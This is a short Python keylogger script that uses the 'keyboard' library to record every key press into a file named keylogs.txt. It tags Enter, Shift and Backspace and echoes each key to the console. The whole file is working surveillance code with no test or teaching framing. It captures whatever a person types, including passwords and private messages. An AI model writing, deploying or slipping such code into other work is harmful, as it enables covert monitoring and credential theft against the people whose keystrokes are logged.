import keyboard

def log_keystrokes():
    with open("keylogs.txt", "a") as log_file:
        while True:
            try:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    key = event.name
                    if len(key) == 1:
                        log_file.write(key)
                    else:
                        if key == "enter":
                            log_file.write("[ENTER]")
                        elif key == "shift":
                            log_file.write("[SHIFT]")
                        elif key == "backspace":
                            log_file.write("[BACKSPACE]")
                    print(event.name)
            except Exception as e:
                print(f"Error: {e}")

if __name__ == "__main__":
    log_keystrokes()
